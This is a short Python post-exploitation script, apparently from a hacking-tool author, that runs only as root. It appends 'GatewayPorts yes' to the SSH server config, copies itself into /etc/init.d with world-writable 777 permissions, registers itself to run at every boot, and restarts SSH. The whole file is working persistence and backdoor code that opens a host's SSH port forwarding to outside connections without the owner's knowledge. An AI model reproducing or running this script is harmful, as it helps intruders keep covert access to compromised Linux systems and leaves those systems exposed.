import os
import sys
import subprocess
import time

#Remote Port Fowarding
#Coded By B3mB4m

def sshdwrite():
	data = open("/etc/ssh/sshd_config", "a")
	data.write("GatewayPorts yes\n")
	data.close()

def startup():
	#We don't need any try&except 
	#Because if we have admin privs nothing can stop us.
	newname = "/etc/init.d/"+os.path.basename(__file__)
	command = "/usr/sbin/update-rc.d %s defaults" % newname
	os.rename(sys.argv[0], newname)
	os.chmod(newname, 777)
	subprocess.call([command], shell=True)


def restartssh():
	#Well, os module has execve function but everyone says its unstable 
	#And has security holes.So I'll use subprocess for that.
	subprocess.call(["/etc/init.d/ssh restart"], shell=True)


if os.getuid() != 0: 
	sys.exit();
else:
	sshdwrite()
	time.sleep(2)
	startup()
	time.sleep(10)
	restartssh()
